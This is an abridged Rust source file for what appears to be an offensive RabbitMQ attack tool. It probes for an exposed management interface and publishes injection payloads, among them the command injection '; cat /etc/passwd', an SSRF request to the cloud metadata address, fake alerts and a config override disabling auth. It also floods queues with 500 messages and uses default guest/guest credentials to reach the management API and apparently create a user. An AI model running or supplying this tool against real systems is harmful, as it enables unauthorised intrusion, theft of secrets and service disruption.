...
pub async fn access(url: &str, timeout: u64) -> anyhow::Result<()> {
    ...
    if status == 200 && (body.contains("rabbitmq") || body.contains("amqp")) {
        println!("  {} RabbitMQ management interface exposed!", "[!]".red().bold());
    }
    ...
    let mgmt_url = format!("{}:15672", url.trim_end_matches(':').split(':').next().unwrap_or(url));
    if let Ok(r) = client.get(&mgmt_url).send().await {
        let s = r.status().as_u16();
        if s == 200 {
            println!("\n  {} Management API also accessible on port 15672", "[!]".red().bold());
        }
    }
...
pub async fn inject(url: &str, timeout: u64) -> anyhow::Result<()> {
    ...
    let client = build_client(timeout);
    let payloads = [
        ("Poison queue", "amq.direct", "poison", "MALICIOUS_MESSAGE_INJECTED"),
        ("Fake alert", "amq.topic", "alerts", "{\"type\":\"critical\",\"msg\":\"System compromised\"}"),
        ("Config override", "amq.topic", "config", "{\"debug\":true,\"auth\":\"disabled\"}"),
        ("Command injection", "amq.direct", "commands", "; cat /etc/passwd"),
        ("SSRF payload", "amq.topic", "webhooks", "http://169.254.169.254/latest/meta-data/"),
    ];
    ...
    for (name, exchange, routing_key, payload) in &payloads {
        ...
        match client.post(url).json(&body).send().await {
            Ok(r) => {
                ...
                let tag = if success { "PUBLISHED".red().bold().to_string() } else { format!("status={}", status) };
...
pub async fn flood(url: &str, timeout: u64) -> anyhow::Result<()> {
    ...
    for i in 0..500u32 {
        ...
        match client.post(url).json(&body).send().await {
            Ok(r) => {
                let status = r.status().as_u16();
                if status == 200 { published += 1; } else { errors += 1; }
            }
            Err(_) => { errors += 1; }
        }
        if i % 100 == 0 && i > 0 {
            println!("  {} Progress: {} messages published, {} errors", "*".cyan(), published, errors);
        }
    }

    println!("\n  {} Results: {} published, {} errors", "[*]".cyan().bold(), published, errors);
    if published > 400 {
...
pub async fn mgmt(url: &str, timeout: u64) -> anyhow::Result<()> {
    ...
    for (name, ep) in &mgmt_endpoints {
        ...
        match client.get(&target).basic_auth("guest", Some("guest")).send().await {
            Ok(r) => {
                let status = r.status().as_u16();
                let text = r.text().await.unwrap_or_default();
    ...
    match client.put(&target).header("Content-Type", "application/json").body(create_user).basic_auth("guest", Some("guest")).send().await {
        Ok(r) => {
            let status = r.status().as_u16();
